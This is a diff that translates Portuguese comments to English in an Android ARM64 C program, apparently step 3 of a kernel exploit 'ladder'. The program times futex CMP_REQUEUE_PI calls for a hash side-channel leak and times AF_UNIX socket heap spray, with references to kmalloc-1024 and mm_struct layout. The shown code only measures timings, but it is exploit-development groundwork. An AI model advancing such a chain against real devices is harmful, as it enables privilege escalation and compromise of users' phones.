@@ -1,16 +1,16 @@
 /*
- * ghostlock_leak_cal.c — passo 3 da escada (calibrador timing-only).
+ * ghostlock_leak_cal.c — step 3 of the ladder (timing-only calibrator).
  *
- * Mede APENAS tempo de syscall em caminhos ja provados seguros:
- *  - CMP_REQUEUE_PI com cmpval divergente -> EAGAIN (reachability check 3,
- *    7/7 PASS no aparelho). Nenhum par PI, nenhum bloqueio, nenhum reclaim.
- *  - socketpair + SO_SNDBUF + send 8K (timing de spray, sem forjar nada).
+ * Measures ONLY syscall timings on paths already proven safe:
+ *  - CMP_REQUEUE_PI with diverging cmpval -> EAGAIN (reachability check 3,
+ *    7/7 PASS on device). No PI pair, no blocking, no reclaim.
+ *  - socketpair + SO_SNDBUF + send 8K (spray timing, without forging anything).
  *
- * NAO cria waiter PI, NAO chama WAIT_REQUEUE_PI, NAO faz LOCK_PI cruzado,
- * NAO toca em cred, NAO escreve em kernel. Risco: mesmo de gettimeofday
- * em loop + EAGAIN. Timeout zero, sem threads, sem fds persistentes.
+ * Does NOT create PI waiter, does NOT call WAIT_REQUEUE_PI, does NOT do cross LOCK_PI,
+ * does NOT touch creds, does NOT write to kernel. Risk: same as gettimeofday
+ * in a loop + EAGAIN. Zero timeout, no threads, no persistent fds.
  *
- * Build (NDK r29, ARM64, API 28, mesma receita do reachability):
+ * Build (NDK r29, ARM64, API 28, same recipe as reachability):
  *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android28-clang \
  *     -O2 -Wall -Wextra -fPIE -pie ghostlock_leak_cal.c -o ghostlock_leak_cal
  * Run:
@@ -65,20 +65,20 @@ int main(void) {
     uint64_t t[NITER];
     int anomalies = 0;
 
-    /* pin CPU0: tira migracao do ruido, igual aresin faz */
+    /* pin CPU0: eliminate migration noise, same as aresin does */
     {
         cpu_set_t m;
         CPU_ZERO(&m);
         CPU_SET(0, &m);
         if (sched_setaffinity(0, sizeof(m), &m))
-            printf("[warn] affinity errno=%d (segue sem pin)\n", errno);
+            printf("[warn] affinity errno=%d (proceeding without pin)\n", errno);
     }
 
     printf("[info] mm_struct=0x338 kmalloc-1024 objs_per_4k=4 (ref build-aq DWARF)\n");
 
-    /* Teste A: best-mediana de NROUND rounds por endereco.
-     * Suprime ruido de escalonamento; sinal de hash aparece como
-     * endereco consistentemente mais lento. */
+    /* Test A: best-median of NROUND rounds per address.
+     * Suppresses scheduling noise; hash signal appears as
+     * consistently slower address. */
     for (int a = 0; a < NADDR; a++) {
         uint32_t *u = &probe[a * 256];
         uint64_t med[NROUND];
@@ -104,7 +104,7 @@ int main(void) {
     }
     printf("[check] EAGAIN anomalies=%d (want 0)\n", anomalies);
 
-    /* Teste B: timing de spray AF_UNIX 8K, sem forjar objeto algum. */
+    /* Test B: AF_UNIX 8K spray timing, without forging any object. */
     {
         int sv[2];
         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv)) {
@@ -122,7 +122,7 @@ int main(void) {
             ssize_t w = send(sv[0], buf, sizeof(buf), MSG_DONTWAIT);
             uint64_t t1 = now_ns();
             if (w != (ssize_t)sizeof(buf)) {
-                /* buffer cheio: esvazia e continua, sem falhar */
+                /* buffer full: drain and continue, without failing */
                 char dr[8192];
                 while (recv(sv[1], dr, sizeof(dr), MSG_DONTWAIT) > 0)
                     ;
